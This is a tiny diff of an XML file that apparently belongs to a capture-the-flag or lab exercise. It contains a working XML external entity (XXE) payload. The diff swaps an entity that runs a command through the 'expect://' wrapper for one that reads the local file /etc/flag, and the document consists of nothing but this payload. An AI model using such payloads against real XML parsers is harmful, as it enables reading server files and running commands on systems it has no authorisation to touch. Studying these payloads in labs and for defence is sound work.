@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE data [
-    <!ENTITY xxe SYSTEM "expect://ls">
+    <!ENTITY xxe SYSTEM "file:///etc/flag">
 ]>
 <data>
     &xxe;
